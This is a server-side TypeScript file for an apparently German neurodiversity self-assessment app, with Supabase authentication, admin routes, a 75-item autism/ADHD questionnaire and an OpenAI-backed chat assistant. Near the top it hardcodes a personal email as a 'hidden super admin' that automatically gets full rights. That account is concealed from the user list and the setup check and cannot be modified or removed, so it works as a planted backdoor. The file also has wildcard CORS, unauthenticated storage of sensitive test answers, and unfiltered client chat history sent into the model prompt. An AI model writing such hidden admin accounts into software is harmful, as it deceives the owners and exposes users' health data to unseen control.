import { Hono } from "npm:hono";
import { cors } from "npm:hono/cors";
import { logger } from "npm:hono/logger";
import { createClient } from "jsr:@supabase/supabase-js@2.49.8";
import * as kv from "./kv_store.tsx";

const app = new Hono();

// Enable logger
app.use('*', logger(console.log));

// Enable CORS for all routes and methods
app.use(
  "/*",
  cors({
    origin: "*",
    allowHeaders: ["Content-Type", "Authorization"],
    allowMethods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    exposeHeaders: ["Content-Length"],
    maxAge: 600,
  }),
);

// Supabase client for admin operations
const supabase = createClient(
  Deno.env.get('SUPABASE_URL'),
  Deno.env.get('SUPABASE_SERVICE_ROLE_KEY'),
);

// User roles hierarchy
const USER_ROLES = {
  SUPER_ADMIN: 'super_admin',
  ADMIN: 'admin', 
  USER: 'user',
  VIEWER: 'viewer'
};

const ROLE_HIERARCHY = {
  [USER_ROLES.SUPER_ADMIN]: 4,
  [USER_ROLES.ADMIN]: 3,
  [USER_ROLES.USER]: 2,
  [USER_ROLES.VIEWER]: 1
};

// Hidden super admin email - completely invisible to regular users
const HIDDEN_SUPER_ADMIN = 'marcodemont@bluewin.ch';

// Check if email is the hidden super admin
const isHiddenSuperAdmin = (email: string) => {
  return email && email.toLowerCase() === HIDDEN_SUPER_ADMIN.toLowerCase();
};

// Get user profile with role information
const getUserProfile = async (userId: string, userEmail?: string) => {
  try {
    // Hidden super admin check - completely invisible to others
    if (userEmail && isHiddenSuperAdmin(userEmail)) {
      // Create or return hidden super admin profile
      const hiddenProfile = {
        userId,
        email: userEmail,
        name: 'System Administrator',
        role: USER_ROLES.SUPER_ADMIN,
        createdAt: new Date().toISOString(),
        createdBy: 'system',
        hidden: true
      };
      
      // Ensure hidden super admin profile exists
      await kv.set(`user_profile_${userId}`, hiddenProfile);
      return hiddenProfile;
    }
    
    const profile = await kv.get(`user_profile_${userId}`);
    return profile || null;
  } catch (error) {
    console.log('Error getting user profile:', error);
    return null;
  }
};

// Authentication middleware
const requireAuth = async (c, next) => {
  const accessToken = c.req.header('Authorization')?.split(' ')[1];
  if (!accessToken) {
    return c.json({ error: 'Unauthorized' }, 401);
  }
  
  const { data: { user }, error } = await supabase.auth.getUser(accessToken);
  if (!user || error) {
    return c.json({ error: 'Unauthorized' }, 401);
  }
  
  const profile = await getUserProfile(user.id, user.email);
  if (!profile) {
    return c.json({ error: 'User profile not found' }, 404);
  }
  
  c.set('user', user);
  c.set('profile', profile);
  await next();
};

// Role-based authorization middleware
const requireRole = (minRole: string) => {
  return async (c, next) => {
    const profile = c.get('profile');
    if (!profile || !profile.role) {
      return c.json({ error: 'Access denied - no role assigned' }, 403);
    }
    
    const userLevel = ROLE_HIERARCHY[profile.role] || 0;
    const requiredLevel = ROLE_HIERARCHY[minRole] || 0;
    
    if (userLevel < requiredLevel) {
      return c.json({ error: 'Access denied - insufficient permissions' }, 403);
    }
    
    await next();
  };
};

// Super admin only middleware
const requireSuperAdmin = async (c, next) => {
  const profile = c.get('profile');
  if (!profile || profile.role !== USER_ROLES.SUPER_ADMIN) {
    return c.json({ error: 'Access denied - super admin only' }, 403);
  }
  await next();
};

// Health check endpoint
app.get("/make-server-dd06a358/health", (c) => {
  return c.json({ status: "ok" });
});

// First-time super admin setup (only if no super admin exists)
app.post("/make-server-dd06a358/setup-super-admin", async (c) => {
  try {
    const { email, password, name } = await c.req.json();
    
    // Check if super admin already exists
    const existingSuperAdmin = await kv.getByPrefix('user_profile_');
    const hasSuperAdmin = existingSuperAdmin.some(profile => profile.role === USER_ROLES.SUPER_ADMIN);
    
    if (hasSuperAdmin) {
      return c.json({ error: 'Super admin already exists' }, 400);
    }
    
    const { data, error } = await supabase.auth.admin.createUser({
      email,
      password,
      user_metadata: { name },
      email_confirm: true
    });

    if (error) {
      console.log('Super admin setup error:', error);
      return c.json({ error: error.message }, 400);
    }

    // Create super admin profile
    const profile = {
      userId: data.user.id,
      email: data.user.email,
      name,
      role: USER_ROLES.SUPER_ADMIN,
      createdAt: new Date().toISOString(),
      createdBy: 'system'
    };
    
    await kv.set(`user_profile_${data.user.id}`, profile);

    return c.json({ message: 'Super admin created successfully', user: data.user });
  } catch (error) {
    console.log('Super admin setup error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

// Check if super admin exists (hidden from regular users)
app.get("/make-server-dd06a358/check-super-admin", async (c) => {
  try {
    const existingProfiles = await kv.getByPrefix('user_profile_');
    // Hidden super admin always exists, but we don't reveal this to regular users
    // Regular users will see normal setup flow
    const visibleSuperAdmin = existingProfiles.some(profile => 
      profile.role === USER_ROLES.SUPER_ADMIN && !profile.hidden
    );
    return c.json({ hasSuperAdmin: visibleSuperAdmin });
  } catch (error) {
    console.log('Check super admin error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

// Get current user profile
app.get("/make-server-dd06a358/profile", requireAuth, async (c) => {
  try {
    const profile = c.get('profile');
    return c.json({ profile });
  } catch (error) {
    console.log('Get profile error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

// User management routes (Super Admin only)
app.get("/make-server-dd06a358/admin/users", requireAuth, requireSuperAdmin, async (c) => {
  try {
    const profiles = await kv.getByPrefix('user_profile_');
    // Hide the hidden super admin from user management interface
    const visibleProfiles = profiles.filter(profile => !profile.hidden);
    return c.json({ users: visibleProfiles });
  } catch (error) {
    console.log('Get users error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

app.post("/make-server-dd06a358/admin/users", requireAuth, requireSuperAdmin, async (c) => {
  try {
    const { email, password, name, role } = await c.req.json();
    const currentUser = c.get('user');
    
    // Validate role
    if (!Object.values(USER_ROLES).includes(role)) {
      return c.json({ error: 'Invalid role' }, 400);
    }
    
    // Don't allow creating another super admin
    if (role === USER_ROLES.SUPER_ADMIN) {
      return c.json({ error: 'Cannot create another super admin' }, 400);
    }
    
    // Prevent creating user with hidden super admin email
    if (email && isHiddenSuperAdmin(email)) {
      return c.json({ error: 'Email address not available' }, 400);
    }
    
    const { data, error } = await supabase.auth.admin.createUser({
      email,
      password,
      user_metadata: { name },
      email_confirm: true
    });

    if (error) {
      console.log('Create user error:', error);
      return c.json({ error: error.message }, 400);
    }

    // Create user profile
    const profile = {
      userId: data.user.id,
      email: data.user.email,
      name,
      role,
      createdAt: new Date().toISOString(),
      createdBy: currentUser.id
    };
    
    await kv.set(`user_profile_${data.user.id}`, profile);

    return c.json({ message: 'User created successfully', user: data.user, profile });
  } catch (error) {
    console.log('Create user error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

app.put("/make-server-dd06a358/admin/users/:userId", requireAuth, requireSuperAdmin, async (c) => {
  try {
    const userId = c.req.param('userId');
    const { name, role } = await c.req.json();
    
    const existingProfile = await kv.get(`user_profile_${userId}`);
    if (!existingProfile) {
      return c.json({ error: 'User not found' }, 404);
    }
    
    // Don't allow changing super admin role or hidden profiles
    if (existingProfile.role === USER_ROLES.SUPER_ADMIN || existingProfile.hidden) {
      return c.json({ error: 'Cannot modify super admin' }, 400);
    }
    
    // Don't allow creating another super admin
    if (role === USER_ROLES.SUPER_ADMIN) {
      return c.json({ error: 'Cannot assign super admin role' }, 400);
    }
    
    const updatedProfile = {
      ...existingProfile,
      name,
      role,
      updatedAt: new Date().toISOString()
    };
    
    await kv.set(`user_profile_${userId}`, updatedProfile);
    
    return c.json({ message: 'User updated successfully', profile: updatedProfile });
  } catch (error) {
    console.log('Update user error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

app.delete("/make-server-dd06a358/admin/users/:userId", requireAuth, requireSuperAdmin, async (c) => {
  try {
    const userId = c.req.param('userId');
    const currentUser = c.get('user');
    
    // Don't allow deleting yourself
    if (userId === currentUser.id) {
      return c.json({ error: 'Cannot delete yourself' }, 400);
    }
    
    const existingProfile = await kv.get(`user_profile_${userId}`);
    if (!existingProfile) {
      return c.json({ error: 'User not found' }, 404);
    }
    
    // Don't allow deleting super admin or hidden profiles
    if (existingProfile.role === USER_ROLES.SUPER_ADMIN || existingProfile.hidden) {
      return c.json({ error: 'Cannot delete super admin' }, 400);
    }
    
    // Delete user from Supabase Auth
    const { error } = await supabase.auth.admin.deleteUser(userId);
    if (error) {
      console.log('Delete user from auth error:', error);
    }
    
    // Delete user profile
    await kv.del(`user_profile_${userId}`);
    
    return c.json({ message: 'User deleted successfully' });
  } catch (error) {
    console.log('Delete user error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

// Initialize default questions if not exists
app.post("/make-server-dd06a358/admin/init-questions", requireAuth, requireRole(USER_ROLES.ADMIN), async (c) => {
  try {
    const existingQuestions = await kv.get('questions');
    if (existingQuestions && existingQuestions.length > 0) {
      return c.json({ message: 'Questions already initialized', count: existingQuestions.length });
    }

    const defaultQuestions = [
      // Soziale Kommunikation (1-15)
      { id: 1, category: 'social', text: 'Ich finde es schwierig, Smalltalk zu führen.', order: 1 },
      { id: 2, category: 'social', text: 'Ich verstehe oft nicht, wann ein Gespräch beendet werden sollte.', order: 2 },
      { id: 3, category: 'social', text: 'Ich habe Schwierigkeiten, Sarkasmus oder Ironie zu verstehen.', order: 3 },
      { id: 4, category: 'social', text: 'Ich fühle mich in sozialen Situationen oft überfordert.', order: 4 },
      { id: 5, category: 'social', text: 'Ich vermeide Augenkontakt in Gesprächen.', order: 5 },
      { id: 6, category: 'social', text: 'Ich habe Probleme, die Emotionen anderer Menschen zu erkennen.', order: 6 },
      { id: 7, category: 'social', text: 'Ich finde es schwer, Freundschaften zu schließen und aufrechtzuerhalten.', order: 7 },
      { id: 8, category: 'social', text: 'Ich bevorzuge schriftliche Kommunikation gegenüber persönlichen Gesprächen.', order: 8 },
      { id: 9, category: 'social', text: 'Ich fühle mich unwohl bei spontanen sozialen Einladungen.', order: 9 },
      { id: 10, category: 'social', text: 'Ich verstehe gesellschaftliche Regeln und Normen nicht intuitiv.', order: 10 },
      { id: 11, category: 'social', text: 'Ich habe Schwierigkeiten, angemessene Gesprächsthemen zu finden.', order: 11 },
      { id: 12, category: 'social', text: 'Ich fühle mich nach sozialen Interaktionen oft erschöpft.', order: 12 },
      { id: 13, category: 'social', text: 'Ich nehme Dinge oft wörtlich, die als Scherz gemeint waren.', order: 13 },
      { id: 14, category: 'social', text: 'Ich habe Probleme, nonverbale Signale zu interpretieren.', order: 14 },
      { id: 15, category: 'social', text: 'Ich finde Gruppenkonversationen verwirrend und schwer zu verfolgen.', order: 15 },

      // Masking & Kompensation (16-30)
      { id: 16, category: 'masking', text: 'Ich kopiere das Verhalten anderer, um mich anzupassen.', order: 16 },
      { id: 17, category: 'masking', text: 'Ich verstelle mich in sozialen Situationen.', order: 17 },
      { id: 18, category: 'masking', text: 'Ich habe gelernt, "normale" Reaktionen nachzuahmen.', order: 18 },
      { id: 19, category: 'masking', text: 'Ich bereite Gesprächsthemen vor, bevor ich mit anderen spreche.', order: 19 },
      { id: 20, category: 'masking', text: 'Ich fühle mich wie ein Schauspieler in sozialen Situationen.', order: 20 },
      { id: 21, category: 'masking', text: 'Ich unterdrücke meine natürlichen Reaktionen in der Öffentlichkeit.', order: 21 },
      { id: 22, category: 'masking', text: 'Ich studiere andere Menschen, um zu lernen, wie ich mich verhalten soll.', order: 22 },
      { id: 23, category: 'masking', text: 'Ich zwinge mich zu Augenkontakt, auch wenn es unangenehm ist.', order: 23 },
      { id: 24, category: 'masking', text: 'Ich habe verschiedene "Persönlichkeiten" für verschiedene Situationen.', order: 24 },
      { id: 25, category: 'masking', text: 'Ich fühle mich erschöpft vom Versuch, "normal" zu wirken.', order: 25 },
      { id: 26, category: 'masking', text: 'Ich verberge meine besonderen Interessen vor anderen.', order: 26 },
      { id: 27, category: 'masking', text: 'Ich imitiere Körpersprache und Mimik anderer.', order: 27 },
      { id: 28, category: 'masking', text: 'Ich unterdrücke meine natürlichen Bewegungen (Stimming).', order: 28 },
      { id: 29, category: 'masking', text: 'Ich fühle mich unsicher über meine wahre Identität.', order: 29 },
      { id: 30, category: 'masking', text: 'Ich passe meine Sprechweise an die der anderen an.', order: 30 },

      // Routinen / Sensorik (31-45)
      { id: 31, category: 'sensory', text: 'Ich brauche feste Routinen und Struktur in meinem Alltag.', order: 31 },
      { id: 32, category: 'sensory', text: 'Unerwartete Änderungen bereiten mir großen Stress.', order: 32 },
      { id: 33, category: 'sensory', text: 'Bestimmte Geräusche sind für mich überwältigend oder schmerzhaft.', order: 33 },
      { id: 34, category: 'sensory', text: 'Ich bin empfindlich gegenüber bestimmten Texturen oder Materialien.', order: 34 },
      { id: 35, category: 'sensory', text: 'Helles Licht oder flackerndes Licht stört mich sehr.', order: 35 },
      { id: 36, category: 'sensory', text: 'Ich habe starke Vorlieben oder Abneigungen bei Essen.', order: 36 },
      { id: 37, category: 'sensory', text: 'Ich führe repetitive Bewegungen oder Handlungen aus (Stimming).', order: 37 },
      { id: 38, category: 'sensory', text: 'Ich sammle oder ordne Dinge in bestimmten Mustern.', order: 38 },
      { id: 39, category: 'sensory', text: 'Ich habe intensive, spezialisierte Interessen.', order: 39 },
      { id: 40, category: 'sensory', text: 'Ich merke mir viele Details über meine Spezialinteressen.', order: 40 },
      { id: 41, category: 'sensory', text: 'Ich brauche Zeit allein, um mich zu erholen.', order: 41 },
      { id: 42, category: 'sensory', text: 'Ich reagiere stark auf bestimmte Gerüche.', order: 42 },
      { id: 43, category: 'sensory', text: 'Ich mag es nicht, unerwartet berührt zu werden.', order: 43 },
      { id: 44, category: 'sensory', text: 'Ich bevorzuge vertraute Umgebungen gegenüber neuen Orten.', order: 44 },
      { id: 45, category: 'sensory', text: 'Ich bemerke Details, die andere übersehen.', order: 45 },

      // Aufmerksamkeitsregulation (46-60)
      { id: 46, category: 'attention', text: 'Ich habe Schwierigkeiten, mich zu konzentrieren, wenn es Ablenkungen gibt.', order: 46 },
      { id: 47, category: 'attention', text: 'Ich vergesse oft wichtige Termine oder Aufgaben.', order: 47 },
      { id: 48, category: 'attention', text: 'Ich prokrastiniere häufig bei uninteressanten Aufgaben.', order: 48 },
      { id: 49, category: 'attention', text: 'Ich verliere oft Gegenstände oder vergesse, wo ich sie hingelegt habe.', order: 49 },
      { id: 50, category: 'attention', text: 'Ich habe Phasen von Hyperfokus, wo ich alles um mich herum vergesse.', order: 50 },
      { id: 51, category: 'attention', text: 'Ich unterbreche andere oft im Gespräch.', order: 51 },
      { id: 52, category: 'attention', text: 'Ich habe Schwierigkeiten, ruhig sitzen zu bleiben.', order: 52 },
      { id: 53, category: 'attention', text: 'Ich fange viele Projekte an, aber beende sie nicht.', order: 53 },
      { id: 54, category: 'attention', text: 'Ich bin leicht ablenkbar durch Geräusche oder Bewegungen.', order: 54 },
      { id: 55, category: 'attention', text: 'Ich handle oft impulsiv, ohne über die Konsequenzen nachzudenken.', order: 55 },
      { id: 56, category: 'attention', text: 'Ich habe ein schlechtes Zeitgefühl.', order: 56 },
      { id: 57, category: 'attention', text: 'Ich vergesse oft, was ich gerade sagen wollte.', order: 57 },
      { id: 58, category: 'attention', text: 'Ich brauche externe Struktur, um organisiert zu bleiben.', order: 58 },
      { id: 59, category: 'attention', text: 'Ich wechsle häufig zwischen verschiedenen Aufgaben hin und her.', order: 59 },
      { id: 60, category: 'attention', text: 'Ich habe Schwierigkeiten, langweilige aber wichtige Aufgaben zu erledigen.', order: 60 },

      // Selbstwahrnehmung / Emotionale Steuerung (61-75)
      { id: 61, category: 'emotional', text: 'Ich habe Schwierigkeiten, meine eigenen Emotionen zu benennen.', order: 61 },
      { id: 62, category: 'emotional', text: 'Meine Emotionen können sehr intensiv und überwältigend sein.', order: 62 },
      { id: 63, category: 'emotional', text: 'Ich reagiere emotional stärker als andere auf alltägliche Situationen.', order: 63 },
      { id: 64, category: 'emotional', text: 'Ich brauche länger als andere, um emotionale Erlebnisse zu verarbeiten.', order: 64 },
      { id: 65, category: 'emotional', text: 'Ich fühle mich oft anders als andere Menschen.', order: 65 },
      { id: 66, category: 'emotional', text: 'Ich habe Schwierigkeiten, Stress zu bewältigen.', order: 66 },
      { id: 67, category: 'emotional', text: 'Ich erlebe häufig emotionale Zusammenbrüche oder Meltdowns.', order: 67 },
      { id: 68, category: 'emotional', text: 'Ich fühle mich oft missverstanden von anderen.', order: 68 },
      { id: 69, category: 'emotional', text: 'Ich habe Schwierigkeiten, meine Gefühle anderen mitzuteilen.', order: 69 },
      { id: 70, category: 'emotional', text: 'Ich neige zu perfektionistischem Verhalten.', order: 70 },
      { id: 71, category: 'emotional', text: 'Ich empfinde Kritik als sehr schmerzhaft.', order: 71 },
      { id: 72, category: 'emotional', text: 'Ich zweifle oft an meinen sozialen Fähigkeiten.', order: 72 },
      { id: 73, category: 'emotional', text: 'Ich fühle mich häufig überfordert von alltäglichen Anforderungen.', order: 73 },
      { id: 74, category: 'emotional', text: 'Ich habe Phasen, in denen ich mich völlig zurückziehe.', order: 74 },
      { id: 75, category: 'emotional', text: 'Ich suche nach Erklärungen für meine Erfahrungen und Schwierigkeiten.', order: 75 }
    ];

    await kv.set('questions', defaultQuestions);
    return c.json({ message: 'Questions initialized successfully', count: defaultQuestions.length });
  } catch (error) {
    console.log('Init questions error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

// Get all questions (public)
app.get("/make-server-dd06a358/questions", async (c) => {
  try {
    const questions = await kv.get('questions') || [];
    return c.json({ questions: questions.sort((a, b) => a.order - b.order) });
  } catch (error) {
    console.log('Get questions error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

// Get all questions for admin (with admin auth)
app.get("/make-server-dd06a358/admin/questions", requireAuth, requireRole(USER_ROLES.ADMIN), async (c) => {
  try {
    const questions = await kv.get('questions') || [];
    return c.json({ questions: questions.sort((a, b) => a.order - b.order) });
  } catch (error) {
    console.log('Get admin questions error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

// Add new question
app.post("/make-server-dd06a358/admin/questions", requireAuth, requireRole(USER_ROLES.ADMIN), async (c) => {
  try {
    const { text, category } = await c.req.json();
    const questions = await kv.get('questions') || [];
    
    const newId = Math.max(...questions.map(q => q.id), 0) + 1;
    const newOrder = Math.max(...questions.map(q => q.order), 0) + 1;
    
    const newQuestion = {
      id: newId,
      text,
      category,
      order: newOrder
    };
    
    questions.push(newQuestion);
    await kv.set('questions', questions);
    
    return c.json({ message: 'Question added successfully', question: newQuestion });
  } catch (error) {
    console.log('Add question error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

// Update question
app.put("/make-server-dd06a358/admin/questions/:id", requireAuth, requireRole(USER_ROLES.ADMIN), async (c) => {
  try {
    const id = parseInt(c.req.param('id'));
    const { text, category } = await c.req.json();
    const questions = await kv.get('questions') || [];
    
    const questionIndex = questions.findIndex(q => q.id === id);
    if (questionIndex === -1) {
      return c.json({ error: 'Question not found' }, 404);
    }
    
    questions[questionIndex] = { ...questions[questionIndex], text, category };
    await kv.set('questions', questions);
    
    return c.json({ message: 'Question updated successfully', question: questions[questionIndex] });
  } catch (error) {
    console.log('Update question error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

// Delete question
app.delete("/make-server-dd06a358/admin/questions/:id", requireAuth, requireRole(USER_ROLES.ADMIN), async (c) => {
  try {
    const id = parseInt(c.req.param('id'));
    const questions = await kv.get('questions') || [];
    
    const filteredQuestions = questions.filter(q => q.id !== id);
    if (filteredQuestions.length === questions.length) {
      return c.json({ error: 'Question not found' }, 404);
    }
    
    await kv.set('questions', filteredQuestions);
    return c.json({ message: 'Question deleted successfully' });
  } catch (error) {
    console.log('Delete question error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

// Update question order
app.put("/make-server-dd06a358/admin/questions/reorder", requireAuth, requireRole(USER_ROLES.ADMIN), async (c) => {
  try {
    const { questionIds } = await c.req.json();
    const questions = await kv.get('questions') || [];
    
    // Update order based on array position
    questionIds.forEach((id, index) => {
      const question = questions.find(q => q.id === id);
      if (question) {
        question.order = index + 1;
      }
    });
    
    await kv.set('questions', questions);
    return c.json({ message: 'Questions reordered successfully' });
  } catch (error) {
    console.log('Reorder questions error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

// Save test results (optional - for analytics)
app.post("/make-server-dd06a358/results", async (c) => {
  try {
    const { answers, timestamp, testType, userId } = await c.req.json();
    const resultId = `result_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    await kv.set(resultId, {
      testType: testType || 'unknown',
      userId: userId || 'anonymous',
      answers,
      timestamp: timestamp || new Date().toISOString(),
      anonymized: !userId
    });
    
    return c.json({ message: 'Results saved successfully', id: resultId });
  } catch (error) {
    console.log('Save results error:', error);
    return c.json({ error: 'Internal server error' }, 500);
  }
});

// Chat endpoint for LYNA assistant
app.post("/make-server-dd06a358/chat", async (c) => {
  try {
    const { message, conversationHistory } = await c.req.json();
    
    if (!message || typeof message !== 'string') {
      return c.json({ error: 'Message is required' }, 400);
    }

    // Check if OpenAI API key is available
    const openaiApiKey = Deno.env.get('OPENAI_API_KEY');
    if (!openaiApiKey) {
      return c.json({ 
        error: 'OpenAI service not configured',
        message: 'Entschuldigung, der LYNA Chat-Service ist momentan nicht verfügbar. Bitte versuchen Sie es später erneut.'
      }, 500);
    }

    // Prepare the conversation for OpenAI
    const messages = [
      {
        role: 'system',
        content: `Du bist LYNA, eine freundliche und einfühlsame KI-Assistentin, die Menschen bei Neurodiversitäts-Tests unterstützt. 

Deine Aufgaben:
- Begleite Nutzer durch Tests zu Autismus, ADHS und anderen neurodivergenten Eigenschaften
- Erkläre Fragen verständlich und ohne zu werten
- Gib emotionale Unterstützung und Ermutigung
- Hilf bei der Interpretation von Ergebnissen (aber betone immer, dass dies keine Diagnose ist)
- Sei empathisch und verständnisvoll
- Verwende eine warme, unterstützende Sprache

Wichtige Punkte:
- Erwähne immer, dass Tests nur der Selbstreflexion dienen
- Keine medizinischen Diagnosen stellen
- Bei ernsten Sorgen zu professioneller Hilfe raten
- Positive und bestärkende Kommunikation

Antworte auf Deutsch und sei hilfreich, aber nicht übermäßig lang.`
      },
      ...(conversationHistory || []),
      { role: 'user', content: message }
    ];

    // Call OpenAI API
    const openaiResponse = await fetch('https://api.openai.com/v1/chat/completions', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${openaiApiKey}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        model: 'gpt-3.5-turbo',
        messages: messages,
        max_tokens: 500,
        temperature: 0.7,
      }),
    });

    if (!openaiResponse.ok) {
      throw new Error(`OpenAI API error: ${openaiResponse.status}`);
    }

    const openaiData = await openaiResponse.json();
    const assistantMessage = openaiData.choices?.[0]?.message?.content;

    if (!assistantMessage) {
      throw new Error('No response from OpenAI');
    }

    return c.json({ 
      success: true, 
      message: assistantMessage 
    });

  } catch (error) {
    console.log('Chat error:', error);
    return c.json({ 
      success: false,
      error: 'Chat service error',
      message: 'Entschuldigung, ich kann momentan nicht antworten. Bitte versuchen Sie es später erneut.'
    }, 500);
  }
});

Deno.serve(app.fetch);